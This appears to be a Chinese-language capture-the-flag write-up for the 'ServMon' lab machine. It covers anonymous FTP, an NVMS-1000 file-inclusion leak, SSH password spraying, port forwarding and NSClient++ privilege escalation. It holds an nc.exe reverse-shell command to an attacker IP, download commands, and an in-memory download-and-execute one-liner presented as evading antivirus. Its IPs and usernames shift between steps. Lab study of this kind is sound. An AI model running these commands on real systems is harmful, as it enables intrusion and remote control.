---
title: ServMon
description: 
tags:
  - FTP
  - NVMS-1000 CVE
  - SSH Port Forwarding
  - Windows 下載並執行檔案
date: 2026-04-07
---

## FTP

FTP 匿名登入，沒什麼好說的，就登上去看發現密碼會放在某個使用者的桌面。

## NVMS-1000 CVE

發現 NVMS-1000 有 LIF 的漏洞，直接把密碼給讀出來。接著 ssh 密碼噴灑就可以得到一組可以登入的 ssh 使用者帳號了。

```bash
nxc ssh -u 'Nathan' -p pass 10.129.219.38
```

## SSH Port Forwarding

發現 port 8443 運行服務 `NSClient++`，不過沒辦法透過外網存取，因此先進行 SSH Port Forwarding：

```bash
sshpass -p 'XXXX' ssh Nadine@10.129.249.255 -NfL 8443:localhost:8443
```

- -N 表示不執行遠端命令
- -f 表示在背景執行
- -L 表示本地端口轉發，格式為 [本地IP:]本地端口:遠端IP:遠端端口

接著就可以順利存取 NSClient++ 的介面。

## 提權

ssh Nathan@10.129.219.38 上面漫遊，可以 `gc nsclient++` 來查看 NSClient++ 的設定檔，發現裡面有一組密碼，可以用於登入 NSClient++ 的介面。其中 `gc` 是指 `get-content` 。
由於 NSClient++ 事由 NT Authority\SYSTEM 執行，接著就是 reverse shell 的事情了：

1. 建立 shell.bat

```bash
\programdata\nc.exe 10.10.14.3 55688 -e cmd
```

2. 上傳 shell.bat 到目標機器上，記得放在 programdata 路徑下。另外，nc.exe 可以在 /usr/share/windows-resources/binaries/nc.exe 找到。

```bash
wget http://10.10.14.3/nc.exe -outfile nc.exe
wget http://10.10.14.3/shell.bat -outfile shell.bat
```

3. 在 NSClient++ 上設定定期 schedule 執行 shell.bat（新增完記得 save config，當然，你也可以 gc nsclient++ 來查看你是否有新增成功）：
    - Settings > external scripts > srcipts > add
        - Section: /settings/external scripts/scripts/ouo
        - Key: command
        - Value: C:\\programdata\\shell.bat
    - Settings > scheduler > schedules > add
        - Section: /settings/scheduler/schedules/ouo_run
        - Key: interval
        - Value: 10s
    - Settings > scheduler > schedules > add
        - Section: /settings/scheduler/schedules/ouo_run
        - Key: command
        - Value: ouo
4. 設定好後，確認有 save config，點擊 Control > Reload，就可以靜靜的等 reverse shell 連回來了。

## Windows 下載並執行檔案

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.2/Get-ServiceACL.ps1',$false);$h.send();iex $h.responseText
certutil -urlcache -f http://10.10.14.3:80/PowerUp.ps1 .\ouo.ps1
```

上面兩個指令同樣是下載檔案，不過第一個指令是直接在記憶體中執行 PowerUp.ps1，第二個指令則是先把 PowerUp.ps1 下載到本地，再執行它。因此，指令一的隱蔽性比較高，可避免檔案落地後被防毒軟體掃描到。另外，kali 中常用的 windows 工具基本上都放在 `/usr/share/windows-resources` 這個路徑底下，可以直接用 `ls /usr/share/windows-resources/` 來查看有哪些工具可以使用。